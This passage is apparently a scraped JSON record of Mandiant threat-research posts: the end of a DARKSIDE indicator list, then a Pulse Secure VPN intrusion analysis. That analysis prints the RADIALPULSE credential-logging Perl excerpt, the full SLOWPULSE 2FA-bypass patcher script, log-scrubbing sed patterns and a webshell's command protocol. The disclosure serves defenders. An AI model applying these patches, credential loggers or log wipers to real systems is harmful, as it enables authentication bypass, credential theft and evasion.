Gen:Trojan.Heur.PT.omZ@bSEA3vk Gen:Variant.Razy.* Trojan.CobaltStrike.CB Trojan.GenericKD.* Trojan.Linux.Ransom.H UAC Protect Malicious UAC bypass program detected Helix VPN ANALYTICS [Abnormal Logon] WINDOWS ANALYTICS [Abnormal RDP Logon] TEAMVIEWER CLIENT [User-Agent] WINDOWS METHODOLOGY [Plink Reverse Tunnel] WINDOWS METHODOLOGY - SERVICES [PsExec] Mandiant Security Validation Actions Organizations can validate their security controls using the following actions with Mandiant Security Validation . VID Title A101-700 Malicious File Transfer - DARKSIDE, Download, Variant #2 A101-701 Malicious File Transfer - DARKSIDE, Download, Variant #3 A101-702 Malicious File Transfer - DARKSIDE, Download, Variant #4 A101-703 Malicious File Transfer - DARKSIDE, Download, Variant #5 A101-704 Malicious File Transfer - DARKSIDE, Download, Variant #6 A101-705 Malicious File Transfer - DARKSIDE, Download, Variant #7 A101-706 Malicious File Transfer - DARKSIDE, Download, Variant #8 A101-707 Malicious File Transfer - DARKSIDE, Download, Variant #9 A101-708 Malicious File Transfer - DARKSIDE, Download, Variant #10 A101-709 Malicious File Transfer - DARKSIDE, Download, Variant #11 A101-710 Malicious File Transfer - DARKSIDE, Download, Variant #12 A101-711 Malicious File Transfer - DARKSIDE, Download, Variant #13 A101-712 Malicious File Transfer - DARKSIDE, Download, Variant #14 A101-713 Malicious File Transfer - DARKSIDE, Download, Variant #15 A101-714 Malicious File Transfer - DARKSIDE, Download, Variant #16 A101-715 Malicious File Transfer - DARKSIDE, Download, Variant #17 A101-716 Malicious File Transfer - DARKSIDE, Download, Variant #18 A101-717 Malicious File Transfer - DARKSIDE, Download, Variant #19 A101-718 Malicious File Transfer - DARKSIDE, Download, Variant #20 A101-719 Malicious File Transfer - DARKSIDE, Download, Variant #21 A101-720 Malicious File Transfer - DARKSIDE, Download, Variant #22 A101-721 Malicious File Transfer - DARKSIDE, Download, Variant #23 A101-722 Malicious File Transfer - DARKSIDE, Download, Variant #24 A101-723 Malicious File Transfer - DARKSIDE, Download, Variant #25 A101-724 Malicious File Transfer - DARKSIDE, Download, Variant #26 A101-725 Malicious File Transfer - DARKSIDE, Download, Variant #27 A101-726 Malicious File Transfer - DARKSIDE, Download, Variant #28 A101-727 Malicious File Transfer - DARKSIDE, Download, Variant #29 A101-728 Malicious File Transfer - DARKSIDE, Download, Variant #30 A101-729 Malicious File Transfer - DARKSIDE, Download, Variant #31 A101-730 Malicious File Transfer - DARKSIDE, Download, Variant #32 A101-731 Malicious File Transfer - DARKSIDE, Download, Variant #33 A101-732 Malicious File Transfer - DARKSIDE, Download, Variant #34 A101-733 Malicious File Transfer - DARKSIDE, Download, Variant #35 A101-734 Malicious File Transfer - DARKSIDE, Download, Variant #36 A101-735 Malicious File Transfer - NGROK, Download, Variant #1 A101-736 Malicious File Transfer - UNC2465, LNK Downloader for SMOKEDHAM, Download A101-737 Malicious File Transfer - BEACON, Download, Variant #3 A101-738 Data Exfiltration - RCLONE, Exfil Over SFTP A101-739 Malicious File Transfer - RCLONE, Download, Variant #2 A101-740 Command and Control - DARKSIDE, DNS Query, Variant #1 A101-741 Command and Control - DARKSIDE, DNS Query, Variant #2 A101-742 Application Vulnerability - SonicWall, CVE-2021-20016, SQL Injection A104-771 Protected Theater - DARKSIDE, PsExec Execution A104-772 Host CLI - DARKSIDE, Windows Share Creation A104-773 Protected Theater - DARKSIDE, Delete Volume Shadow Copy Related Indicators UNC2628 Indicator Description 104.193.252[.]197:443 BEACON C2 162.244.81[.]253:443 BEACON C2 185.180.197[.]86:443 BEACON C2 athaliaoriginals[.]com BEACON C2 lagrom[.]com BEACON C2 ctxinit.azureedge[.]net BEACON C2 45.77.64[.]111 Login Source 181ab725468cc1a8f28883a95034e17d BEACON Sample UNC2659 Indicator Description 173.234.155[.]208 Login Source UNC2465 Indicator Description 81.91.177[.]54 :7234 Remote Access koliz[.]xyz File Hosting los-web[.]xyz EMPIRE C2 sol-doc[.]xyz Malicious Infrastructure hxxp://sol-doc[.]xyz/sol/ID-482875588 Downloader URL 6c9cda97d945ffb1b63fd6aabcb6e1a8 Downloader LNK 7c8553c74c135d6e91736291c8558ea8 VBS Launcher 27dc9d3bcffc80ff8f1776f39db5f0a4 Ngrok Utility DARKSIDE Ransomware Encryptor DARKSIDE Sample MD5 04fde4340cc79cd9e61340d4c1e8ddfb 0e178c4808213ce50c2540468ce409d3 0ed51a595631e9b4d60896ab5573332f 130220f4457b9795094a21482d5f104b 1a700f845849e573ab3148daef1a3b0b 1c33dc87c6fdb80725d732a5323341f9 222792d2e75782516d653d5cccfcf33b 29bcd459f5ddeeefad26fc098304e786 3fd9b0117a0e79191859630148dcdc6d 47a4420ad26f60bb6bba5645326fa963 4d419dc50e3e4824c096f298e0fa885a 5ff75d33080bb97a8e6b54875c221777 66ddb290df3d510a6001365c3a694de2 68ada5f6aa8e3c3969061e905ceb204c 69ec3d1368adbe75f3766fc88bc64afc 6a7fdab1c7f6c5a5482749be5c4bf1a4 84c1567969b86089cc33dccf41562bcd 885fc8fb590b899c1db7b42fe83dddc3 91e2807955c5004f13006ff795cb803c 9d418ecc0f3bf45029263b0944236884 9e779da82d86bcd4cc43ab29f929f73f a3d964aaf642d626474f02ba3ae4f49b b0fd45162c2219e14bdccab76f33946e b278d7ec3681df16a541cf9e34d3b70a b9d04060842f71d1a8f3444316dc1843 c2764be55336f83a59aa0f63a0b36732 c4f1a1b73e4af0fbb63af8ee89a5a7fe c81dae5c67fb72a2c2f24b178aea50b7 c830512579b0e08f40bc1791fc10c582 cfcfb68901ffe513e9f0d76b17d02f96 d6634959e4f9b42dfc02b270324fa6d9 e44450150e8683a0addd5c686cd4d202 f75ba194742c978239da2892061ba1b4 f87a2e1c3d148a67eaeb696b1ab69133 f913d43ba0a9f921b1376b26cd30fa34 f9fc1a1a95d5723c140c2a8effc93722 Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2021/04/suspected-apt-actors-leverage-bypass-techniques-pulse-secure-zero-day.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2021-04-20",
                    "source": "www.fireeye.com"
                },
                "text": "Executive Summary Mandiant recently responded to multiple security incidents involving compromises of Pulse Secure VPN appliances. This blog post examines multiple, related techniques for bypassing single and multifactor authentication on Pulse Secure VPN devices, persisting across upgrades, and maintaining access through webshells. The investigation by Pulse Secure has determined that a combination of prior vulnerabilities and a previously unknown vulnerability discovered in April 2021, CVE-2021-22893 , are responsible for the initial infection vector. Pulse Secure’s parent company, Ivanti, released mitigations for a vulnerability exploited in relation to these malware families and the Pulse Connect Secure Integrity Tool for their customers to determine if their systems are impacted. A final patch to address the vulnerability will be available in early May 2021. Pulse Secure has been working closely with Mandiant, affected customers, government partners, and other forensic experts to address these issues. There is no indication the identified backdoors were introduced through a supply chain compromise of the company’s network or software deployment process. Introduction Mandiant is currently tracking 12 malware families associated with the exploitation of Pulse Secure VPN devices. These families are related to the circumvention of authentication and backdoor access to these devices, but they are not necessarily related to each other and have been observed in separate investigations. It is likely that multiple actors are responsible for the creation and deployment of these various code families. The focus of this report is on the activities of UNC2630 against U.S. Defense Industrial base (DIB) networks, but detailed malware analysis and detection methods for all samples observed at U.S. and European victim organizations are provided in the technical annex to assist network defenders in identifying a large range of malicious activity on affected appliances. Analysis is ongoing to determine the extent of the activity. Mandiant continues to collaborate with the Ivanti and Pulse Secure teams, Microsoft Threat Intelligence Center (MSTIC), and relevant government and law enforcement agencies to investigate the threat, as well as develop recommendations and mitigations for affected Pulse Secure VPN appliance owners. As part of their investigation, Ivanti has released mitigations for a vulnerability exploited in relation to this campaign as well as the Pulse Connect Secure Integrity Tool to assist with determining if systems have been impacted. Details Early this year, Mandiant investigated multiple intrusions at defense, government, and financial organizations around the world. In each intrusion, the earliest evidence of attacker activity traced back to DHCP IP address ranges belonging to Pulse Secure VPN appliances in the affected environment. In many cases, we were not able to determine how actors obtained administrator-level access to the appliances. However, based on analysis by Ivanti, we suspect some intrusions were due to the exploitation of previously disclosed Pulse Secure vulnerabilities from 2019 and 2020 while other intrusions were due to the exploitation of CVE-2021-22893 . We observed UNC2630 harvesting credentials from various Pulse Secure VPN login flows, which ultimately allowed the actor to use legitimate account credentials to move laterally into the affected environments. In order to maintain persistence to the compromised networks, the actor utilized legitimate, but modified, Pulse Secure binaries and scripts on the VPN appliance. This was done to accomplish the following: Trojanize shared objects with malicious code to log credentials and bypass authentication flows, including multifactor authentication requirements. We track these trojanized assemblies as SLOWPULSE and its variants. Inject webshells we currently track as RADIALPULSE and PULSECHECK into legitimate Internet-accessible Pulse Secure VPN appliance administrative web pages for the devices. Toggle the filesystem between Read-Only and Read-Write modes to allow for file modification on a typically Read-Only filesystem. Maintain persistence across VPN appliance general upgrades that are performed by the administrator. Unpatch modified files and delete utilities and scripts after use to evade detection. Clear relevant log files utilizing a utility tracked as THINBLOOD based on an actor defined regular expression. In a separate incident in March 2021, we observed UNC2717 using RADIALPULSE, PULSEJUMP, and HARDPULSE at a European organization. Although we did not observe PULSEJUMP or HARDPULSE used by UNC2630 against U.S. DIB companies, these malware families have shared characteristics and serve similar purposes to other code families used by UNC2630. We also observed an OpenSSL library file modified in similar fashion as the other trojanized shared objects. We believe that the modified library file, which we’ve named LOCKPICK, could weaken encryption for communications used by the appliance, but do not have enough evidence to confirm this. Due to a lack of context and forensic evidence at this time, Mandiant cannot associate all the code families described in this report to UNC2630 or UNC2717. We also note the possibility that one or more related groups is responsible for the development and dissemination of these different tools across loosely connected APT actors. It is likely that additional groups beyond UNC2630 and UNC2717 have adopted one or more of these tools. Despite these gaps in our understanding, we included detailed analysis, detection techniques, and mitigations for all code families in the Technical Annex. SLOWPULSE During our investigation into the activities of UNC2630, we uncovered a novel malware family we labeled SLOWPULSE. This malware and its variants are applied as modifications to legitimate Pulse Secure files to bypass or log credentials in the authentication flows that exist within the legitimate Pulse Secure shared object libdsplibs.so . Three of the four discovered variants enable the attacker to bypass two-factor authentication. A brief overview of these variants is covered in this section, refer to the Technical Annex for more details. SLOWPULSE Variant 1 This variant is responsible for bypassing LDAP and RADIUS-2FA authentication routines if a secret backdoor password is provided by the attacker. The sample inspects login credentials used at the start of each protocol’s associated routine and strategically forces execution down the successful authentication patch if the provided password matches the attacker's chosen backdoor password. LDAP Auth Bypass The routine DSAuth::LDAPAuthServer::authenticate begins the LDAP authentication procedure. This variant inserts a check against the backdoor password after the bind routine so that the return value can be conditionally stomped to spoof successful authentication. Figure 1: LDAP Auth Bypass RADIUS Two Factor Auth Bypass The routine DSAuth::RadiusAuthServer::checkUsernamePassword begins the RADIUS-2FA authentication procedure. This variant inserts checks against the backdoor password after the RADIUS authentication packet is received back from the authentication server. If the backdoor password is provided by the attacker, the packet type and successful authentication status flags are overwritten to spoof successful authentication. Figure 2: Radius-2FA Bypass SLOWPULSE Variant 2 ACE Two Factor Auth Credential Logging This variant logs credentials used during the ACE-2FA authentication procedure DSAuth::AceAuthServer::checkUsernamePassword . Rather than bypassing authentication, this variant logs the username and password to a file for later use by the attacker. Figure 3: ACE Auth Credential Log SLOWPULSE Variant 3 ACE Two Factor Auth Bypass This variant is responsible for bypassing the ACE-2FA logon procedure starting with DSAuth::AceAuthServer::checkUsernamePassword . The flow of the authentication procedure is modified to bypass the routine responsible for verifying the username and password if the backdoor password is provided. With this modification the attacker can spoof successful authentication. Figure 4: ACE Auth Bypass Variant SLOWPULSE Variant 4 RealmSignin Two Factor Auth Bypass This variant bypasses the RealmSignin::runSecondaryAuth procedure of the Pulse Secure VPN. The inserted logic modifies the execution flow of a specific step of the login process to spoof successful authentication. We believe that this may be a two-factor authentication bypass. Figure 5: RealmSignIn 2FA Auth Bypass Attribution We are in the early stages of gathering evidence and making attribution assessments and there are a number of gaps in our understanding of UNC2630, UNC2717, and these 12 code families. Nevertheless, the Mandiant and Ivanti teams are proactively releasing this analysis to assist network defenders in triaging and identifying malicious activity on affected appliances. Mandiant is able to assess that: UNC2630 targeted U.S. DIB companies with SLOWPULSE, RADIALPULSE, THINBLOOD, ATRIUM, PACEMAKER, SLIGHTPULSE, and PULSECHECK as early as August 2020 until March 2021. We suspect UNC2630 operates on behalf of the Chinese government and may have ties to APT5 UNC2717 targeted global government agencies between October 2020 and March 2021 using HARDPULSE, QUIETPULSE, AND PULSEJUMP. We do not have enough evidence about UNC2717 to determine government sponsorship or suspected affiliation with any known APT group. We do not have enough information about the use of LOCKPICK to make an attribution statement. UNC2630 UNC2630’s combination of infrastructure, tools, and on-network behavior appear to be unique, and we have not observed them during any other campaigns or at any other engagement. Despite these new tools and infrastructure, Mandiant analysts noted strong similarities to historic intrusions dating back to 2014 and 2015 and conducted by Chinese espionage actor APT5. We have also uncovered limited evidence to suggest that UNC2630 operates on behalf of the Chinese government. Analysis is still ongoing to determine the full scope of the activity that maybe related to the group. Although we are not able to definitively connect UNC2630 to APT5, or any other existing APT group, a trusted third party has uncovered evidence connecting this activity to historic campaigns which Mandiant tracks as Chinese espionage actor APT5. While we cannot make the same connections, the third party assessment is consistent with our understanding of APT5 and their historic TTPs and targets. APT5 has shown significant interest in compromising networking devices and manipulating the underlying software which supports these appliances. They have also consistently targeted defense and technology companies in the U.S., Europe, and Asia. As early as 2014, Mandiant Incident Response discovered APT5 making unauthorized code modifications to files in the embedded operating system of another technology platform. In 2015, APT5 compromised a U.S. telecommunications organization providing services and technologies for private and government entities. During this intrusion, the actors downloaded and modified some of the router images related to the company’s network routers. Also during this time, APT5 stole files related to military technology from a South Asian defense organization. Observed filenames suggest the actors were interested in product specifications, emails concerning technical products, procurement bids and proposals, and documents on unmanned aerial vehicles (UAVs). APT5 persistently targets high value corporate networks and often re-compromises networks over many years. Their primary targets appear to be aerospace and defense companies located in the U.S., Europe, and Asia. Secondary targets (used to facilitate access to their primary targets) include network appliance manufacturers and software companies usually located in the U.S. Recommendations All Pulse Secure Connect customers should assess the impact of the Pulse Secure mitigations and apply it if possible. Organizations should utilize the most recent version of Pulse Secure’s Integrity Assurance utility released on March 31, 2021. If a device fails this Integrity Assurance utility, network administrators should follow the instructions here and contact their Pulse CSR for additional guidance. Organizations should examine available forensic evidence to determine if an attacker compromised user credentials. Ivanti highly recommends resetting all passwords in the environment and reviewing the configuration to ensure no service accounts can be used to authenticate to the vulnerability. Additional detections, mitigations and relevant MITRE ATT&CK techniques are included in the Technical Annex. Sample hashes and analysis are included to enable defenders to quickly assess if their respective appliances have been affected. Yara rules, Snort rules, and hashes are published on Mandiant’s GitHub page . Detections and Mitigations 1d3ab04e21cfd40aa8d4300a359a09e3b520d39b1496be1e4bc91ae1f6730ecc HARDPULSE contains an embedded 'recovery' URL https://ive-host/dana-na/auth/recover[.]cgi?token=<varies> that may be accessed by an attacker. The sample uses the POST parameters checkcode , hashid , m , and filename . This URL is not present in legitimate versions of this file. 7fa71a7f76ef63465cfeacf58217e0b66fc71bc81d37c44380a6f572b8a3ec7a 68743e17f393d1f85ee937dffacc91e081b5f6f43477111ac96aa9d44826e4d2 d72daafedf41d484f7f9816f7f076a9249a6808f1899649b7daa22c0447bb37b PULSEJUMP, RADIALPULSE AND PACEMAKER use the following files to record credentials: /tmp/dsactiveuser.statementcounters /tmp/dsstartssh.statementcounters /tmp/dsserver-check.statementcounters cd09ec795a8f4b6ced003500a44d810f49943514e2f92c81ab96c33e1c0fbd68 The malicious operations of SLOWPULSE can be detected via log correlation between the authentication servers responsible for LDAP and RADIUS auth and the VPN server. Authentication failures in either LDAP or RADIUS logs with the associated VPN logins showing success would be an anomalous event worthy of flagging. a1dcdf62aafc36dd8cf64774dea80d79fb4e24ba2a82adf4d944d9186acd1cc1 Upon invocation of the PULSECHECK webshell, the following HTTP request headers will be sent: Key Value REQUEST_METHOD POST HTTP_X_KEY <BackdoorKey> HTTP_X_CNT <RC4Key> HTTP_X_CMD <RC4Command> 1ab50b77dd9515f6cd9ed07d1d3176ba4627a292dc4a21b16ac9d211353818bd SLOWPULSE VARIANT 2 writes ACE logon credentials to the file /home/perl/PAUS.pm in a+ (append) mode, using the format string %s:%s\\n . 68743e17f393d1f85ee937dffacc91e081b5f6f43477111ac96aa9d44826e4d2 PACEMAKER is saved at filepath /home/bin/memread Executed with commandline flags –t , -m , -s Attaches to victim processes with PTRACE and opens subfiles in /proc/ 88170125598a4fb801102ad56494a773895059ac8550a983fdd2ef429653f079 THINBLOOD creates the files: /home/runtime/logs/log.events.vc1 /home/runtime/logs/log.events.vc2 /home/runtime/logs/log.access.vc1 /home/runtime/logs/log.access.vc2 Executes the system API with the mv command specifying one of the files above, targeting: /home/runtime/logs/log.access.vc0 /home/runtime/logs/log.events.vc0 Executes the rm command specify one of the .vc1 files above 133631957d41eed9496ac2774793283ce26f8772de226e7f520d26667b51481a SLIGHTPULSE uses /tmp/1 as command execution log All POST requests to meeting_testjs.cgi are suspicious POST parameters: cert , img , name are used by malicious logic Responses to the endpoint with the name parameter respond with no-cache and image/gif 1741dc0a491fcc8d078220ac9628152668d3370b92a8eae258e34ba28c6473b9 THINBLOOD execution of sed on the files: log.events.vc0 log.access.vc0 Log.admin.vc0 Sed patterns used: s/.\\x00[^\\x00]*<regex_string>[^\\x00]*\\x09.\\x00//g s/\\x<hex_char>\\x00[^\\x00]*<regex_string>[^\\x00]*\\x09\\x<hex_char>\\x00//g 06c56bd272b19bf7d7207443693cd1fc774408c4ca56744577b11fee550c23f7 The sample accepts an input and output file as its first and second arguments, then writes a patched version of the input out. The commandline argument e or E must be supplied as the fourth argument. Example command line: ./patcher input.bin output.bin backdoorkey e f2b1bd703c3eb05541ff84ec375573cbdc70309ccb82aac04b72db205d718e90 The sample uses the HTTP query parameter id and responds with HTTP headers \"Cache-Control: no-cache\\n\" and \"Content-type: text/html\\n\\n\". 224b7c45cf6fe4547d3ea66a12c30f3cb4c601b0a80744154697094e73dbd450 64c87520565165ac95b74d6450b3ab8379544933dd3e2f2c4dc9b03a3ec570a7 78d7c7c9f800f6824f63a99d935a4ad0112f97953d8c100deb29dae24d7da282 705cda7d1ace8f4adeec5502aa311620b8d6c64046a1aed2ae833e2f2835154f Execute sed on PulseSecure system files Remounts filesystem as writable: system(\"/bin/mount -o remount,rw /dev/root /\") Unexpected execution of other system commands such as tar , cp , rm MITRE ATT&CK Techniques The following list of MITRE ATT&CK techniques cover all malware samples described in this report as well as those observed throughout the lifecycle of UNC2630 and UNC2717. T1003-OS Credential Dumping T1016-System Network Configuration Discovery T1021.001-Remote Desktop Protocol T1027-Obfuscated Files or Information T1036.005-Match Legitimate Name or Location T1048-Exfiltration Over Alternative Protocol T1049-System Network Connections Discovery T1053-Scheduled Task/Job T1057-Process Discovery T1059-Command and Scripting Interpreter T1059.003-Windows Command Shell T1070-Indicator Removal on Host T1070.001-Clear Windows Event Logs T1070.004-File Deletion T1071.001-Web Protocols T1082-System Information Discovery T1098-Account Manipulation T1105-Ingress Tool Transfer T1111-Two-Factor Authentication Interception T1133-External Remote Services T1134.001 Access Token Manipulation: Token Impersonation/Theft T1136-Create Account T1140-Deobfuscate/Decode Files or Information T1190-Exploit Public-Facing Application T1505.003-Web Shell T1518-Software Discovery T1554-Compromise Client Software Binary T1556.004-Network Device Authentication T1592.004 Gather Victim Host Information: Client Configurations T1562 Impair Defenses T1569.002-Service Execution T1574 Hijack Execution Flow T1600-Weaken Encryption Figure 6: MITRE ATT&CK Map Technical Annex SLIGHTPULSE The file meeting_testjs.cgi (SHA256: 133631957d41eed9496ac2774793283ce26f8772de226e7f520d26667b51481a ) is a webshell capable of arbitrary file read, write, and command execution. Malicious logic is inserted at the end of legitimate logic to respond to POST requests. We believe this webshell may be responsible for placing additional webshells and used to modify legitimate system components resulting in the other observed malware families due to its functionality. The malicious logic inserts a branch condition to respond to HTTP POST requests rather than just the typical GET requests expected of the legitimate code. If GET requests are performed the legitimate logic is still invoked. POST requests have a series of parameters checked for existence to determine which command to invoke. This logic is: POST params Invoked Command cert writefile img, name with nonempty value readfile img set to empty string \"\", name execcmd anything else invoke original legitimate logic Figure 7: Webshells respond to POSTs All incoming and outgoing requests are base64 encoded/decoded and RC4 encrypted/decrypted. The scheme is simple. The first six characters of the data are a random key generated per request as a sort of nonce, with the static RC4 key appended. This nonce + phrase together act as the RC4 key. The phrase is not sent over the wire, only the nonce. This entire key is then used to encrypt/decrypt payload data that immediately follows the key. The form of data on the wire is: Outbound/Inbound: <6randbytes><encrypted_data> ^-RC4NONCE-^ Usage: <6randbytes><rc4_phrase><encrypted_data> ^-------RC4 KEY--------^ ReadFile This command accepts a base64 encoded, RC4 encrypted file name via the img parameter and opens it for read. The file contents are read in full then sent back to the attacker as base64 encoded, RC4 encrypted data with the headers \"Content-type: application/x-download\\n\" , and form header \"Content-Disposition: attachment; filename=tmp\\n\\n\" . WriteFile This command accepts a base64 encoded, RC4 encrypted filename via the cert parameter, and base64 encoded, RC4 encrypted file data via the parameter md5 . The filename is opened in write mode with the file data being written to the file before the file is closed. The results of this command are sent back to the attacker, using the headers \"Cache-Control: no-cache\\n\" and \"Content-type: text/html\\n\\n\" . Execute This command accepts a base64 encoded, RC4 encrypted commands via the name parameter. The malicious logic forbids the cd command and will respond with the text Error 404 if executed. All other commands will be executed via the system API with output piped to the file /tmp/1 . The full system command is <command> >/tmp/1 2>&1 . The output of this execution is read and sent back to the attacker base64 encoded, RC4 encrypted. The headers \"Cache-Control: no-cache\\n\" and \"Content-type: image/gif\\n\\n\" are used. The response appears to be masquerading as a GIF when sending back this command output. RADIALPULSE The file with the SHA256 hash d72daafedf41d484f7f9816f7f076a9249a6808f1899649b7daa22c0447bb37b is a modified Perl script associated with a PulseSecure web-based tool which causes usernames, passwords and information associated with logins to this application to be written to the file /tmp/dsstartssh.statementcounters . Retrieval of these login credentials must be achieved through other means such as an interactive login or a webshell. Persistence is achieved by the addition of compromised code which is continually served when requesting this PulseSecure webpage. An excerpt of the code related to credential stealing is shown as follows: my $realmName1 = $signin->getRealmInfo()->{name}; open(*fd, \">>/tmp/dsstartssh.statementcounters\"); syswrite(*fd, \"realm=$realmName1 \", 5000); syswrite(*fd, \"username=$username \", 5000); syswrite(*fd, \"password=$password\\n\", 5000); close(*fd); SLOWPULSE Variant 1 The file libdsplibs.so with SHA256 cd09ec795a8f4b6ced003500a44d810f49943514e2f92c81ab96c33e1c0fbd68 is a trojanized ELF shared object belonging to the PulseSecure VPN server. The sample has been modified to bypass specific authentication mechanisms of the LDAP and RADIUS protocols. The sample hardcodes a backdoor key that will silently subvert auth failures if the correct backdoor key is passed, establishing a VPN connection as if auth succeeded. If the backdoor password is not used, authentication will fail as normal. In multiple locations assembly is written into the padding regions between legitimate functions. As these regions are very small, around 20 bytes, the malicious logic stitches itself together by unconditionally jumping between multiple padding regions. The assembly is written in a way very similar to mid-function hooks, where it is common to push and then pop all flags and registers before and after the injected logic. By preserving registers and flags in this way the malicious logic is able to execute and perform its malicious logic as a passive observer if desired, only effecting the control flow in specific conditions. This is employed in two locations, the LDAP and RADIUS authentication routines, DSAuth::LDAPAuthServer::authenticate and DSAuth::RadiusAuthServer::checkUsernamePassword respectively. LDAP Auth Bypass In the typical execution of DSAuth::LDAPAuthServer::authenticate the legitimate application constructs the C++ object DSAuth::LDAPAuthServer::ldap then passes it to DSLdapServer::bind with the username and password for login. This bind may fail or succeed which determines the authentication failure or success of the LDAP protocol. The malicious logic inserted into the application redirects execution before DSLdapServer::bind just after the ldap object is constructed. At this point in execution the username and password are easily extracted from memory with mid-function hooking techniques, which the sample copies to a code cave in memory between two functions as a temporary storage location. The malicious logic then invokes DSLdapServer::bind as the normal logic would, which sets the return register EAX to 0 or 1 for failure or success. A check is then executed where the temporary password copy made earlier is checked against a hardcoded backdoor password. If this check passes the backdoor logic actives by overwriting EAX to 1 to force the application down the execution path of successful authentication, even though in reality authentication failed. RADIUS Two Factor Auth Bypass In the typical execution of DSAuth::RadiusAuthServer::checkUsernamePassword the legitimate application sends a RADIUS-2FA auth packet with username and password via RadiusAuthPacket::sendRadiusPacket . The response is then retrieved and parsed by the routine DSAuth::RadiusAuthServer::handleResponse . After packet retrieval the packet type is verified to be 3, it's not known what this packet type specifies but this is the packet type of a successful authentication response. If the packet type check passes, then the sample reads a field of the packet that specifies if authentication was successful or not and then checks this status later. The inserted malicious logic hijacks execution just after DSAuth::RadiusAuthServer::handleResponse where the password sent to the RADIUS server is checked against a backdoor password. If this check passes the malicious logic overwrites the retrieved packet with values indicating that it's of type 3 and that authentication was successful. The malicious logic then rejoins the original execution flow where the packet type is checked. If written the spoofed values force the application down the execution path of successful authentication, even though in reality authentication failed. SLOWPULSE Variant 2 ACE Two Factor Auth Credential Logging We also identified a variant of SLOWPULSE (SHA256: 1ab50b77dd9515f6cd9ed07d1d3176ba4627a292dc4a21b16ac9d211353818bd ) which logs credentials used during ACE-2FA protocol authentication. The backdoor is implemented in the routine DSAuth::AceAuthServer::checkUsernamePassword . As part of the login procedure the username and password are retrieved then written into a map entry structure. The backdoor inserts an unconditional jump into the logon logic that takes this map entry structure, reads the username and password fields, then writes them to the file /home/perl/PAUS.pm in a+ (append) mode, using the format string %s:%s\\n . The backdoor then unconditionally jumps back into the normal control flow to continue the logon process as normal. SLOWPULSE Variant 3 ACE Two Factor Auth Bypass We Identified another variant of SLOWPULSE (SHA256: b1c2368773259fbfef425e0bb716be958faa7e74b3282138059f511011d3afd9 ) which is similar to SLOWPULSE VARIANT 2 the malicious logic lives within DSAuth::AceAuthServer::checkUsernamePassword , however this variant bypasses the logon procedure rather than login credentials. Typical execution of this routine calls DsSecID_checkLogin to validate the username and password which sets the EAX register to 1. The routine DSAuth::AceAuthServer::handleACEAuthResult then checks EAX to determine if auth was successful or not. The malicious logic hijacks execution immediately after the username and password fields are written to their map entries, then checks if the password matches the backdoor password. If the password matches, then the EAX register is overwritten to 1. This puts the program in the same state as if DsSecID_checkLogin had successfully executed, but unlike SLOWPULSE VARIANT 1 the original authentication routine is not called at all. The malicious logic then rejoins execution before DSAuth::AceAuthServer::handleACEAuthResult which will now pass. This forces the application down the execution path of successful authentication, even though in reality authentication would have failed. SLOWPULSE Variant 4 RealmSignin Two Factor Auth Bypass We identified a fourth variant of SLOWPULSE responsible for bypassing what may be the two-factor authentication step of the DSAuth::RealmSignin process. The backdoor is present within the function DSAuth::RealmSignin::runSigninStep .This routine is responsible for multiple steps of the login procedure and is implemented as a large switch statement. Case 11 of the switch statement typically calls the routines DSMap::setPrivacyKeyNames then DSAuth::RealmSignin::runSecondaryAuth . The malicious logic in this variant overwrites the call to DSAuth::RealmSignin::runSecondaryAuth with mov eax, 1. This forces application flow as if DSAuth::RealmSignin::runSecondaryAuth always succeeds, without ever calling it. We were not able to recover a file with these patches applied as the attacker removed their patches after use. However, we did uncover both the patcher and unpatcher utilities. We do not provide a hash for this file as we have not recovered it from a system in the field. This analysis was performed by replaying the changes performed by the patcher we did recover. SLOWPULSE Variant 2 Patcher As part of our investigation into the SLOWPULSE family we were able to recover the utility used by the attacker to insert the malicious logic into the original libdsplibs.so file. The file with SHA256: c9b323b9747659eac25cec078895d75f016e26a8b5858567c7fb945b7321722c is responsible for inserting SLOWPULSE V2 malicious logic to log ACE credentials. The patcher accepts two command line arguments, the path to the original binary and the patched output file path. The original binary is read into memory, patched, and then written to the output path. The assembly patches and offsets into the original binary are hardcoded. SLOWPULSE Variant 3 Patcher As part of our investigation into the SLOWPULSE family we were able to recover the utility used by the attacker to insert the malicious logic into the original libdsplibs.so file. The file with SHA256: 06c56bd272b19bf7d7207443693cd1fc774408c4ca56744577b11fee550c23f7 is responsible for inserting SLOWPULSE V3 malicious logic to bypass ACE logon authentication process. The patcher accepts four arguments. The first argument is the original binary path, the second the patched output file path, third is the backdoor bypass password, and fourth is the letter e specifying to apply patches. The sample reads the original binary into memory, applies the assembly patches associated with SLOWPULSE V3, as well as the provided bypass password, then written to the output path. The assembly patches, and all offsets including where to copy the bypass password are hardcoded. SLOWPULSE Variant 4 Patcher As part of our investigation into the SLOWPULSE family we recovered the utility the attacker used to insert the malicious logic into the original libdsplibs.so file. The file with SHA256: e63ab6f82c711e4ecc8f5b36046eb7ea216f41eb90158165b82a6c90560ea415 responsible for inserting the patch for SLOWPULSE V3. The patch applied overwrites a single call to DSAuth::RealmSignin::runSecondaryAuth with mov eax, 1 . This patcher utility is a simple bash script, unlike the previous patchers which were compiled applications likely written in C. The script in full is: printf '\\xB8' | dd conv=notrunc of=/home/lib/libdsplibs.so bs=1 count=1 seek=$((0x5C7B31)) printf '\\x01' | dd conv=notrunc of=/home/lib/libdsplibs.so bs=1 count=1 seek=$((0x5C7B32)) printf '\\x00' | dd conv=notrunc of=/home/lib/libdsplibs.so bs=1 count=1 seek=$((0x5C7B33)) printf '\\x00' | dd conv=notrunc of=/home/lib/libdsplibs.so bs=1 count=1 seek=$((0x5C7B34)) printf '\\x00' | dd conv=notrunc of=/home/lib/libdsplibs.so bs=1 count=1 seek=$((0x5C7B35)) SLOWPULSE Variant 4 UnPatcher As part of our investigation into the SLOWPULSE family we were able to recover the utility used by the attacker to remove the malicious logic into the original libdsplibs.so file for SLOWPULSE V4. The attacker chose to remove the patches applied to libdsplibs.so . The file with SHA256: b2350954b9484ae4eac42b95fae6edf7a126169d0b93d79f49d36c5e6497062a is the unpatcher utility for SLOWPULSE V4. This sample is also a simple bash script, in full it is: printf '\\xE8' | dd conv=notrunc of=/home/lib/libdsplibs.so bs=1 count=1 seek=$((0x5C7B31)) printf '\\xE2' | dd conv=notrunc of=/home/lib/libdsplibs.so bs=1 count=1 seek=$((0x5C7B32)) printf '\\x08' | dd conv=notrunc of=/home/lib/libdsplibs.so bs=1 count=1 seek=$((0x5C7B33)) printf '\\xD0' 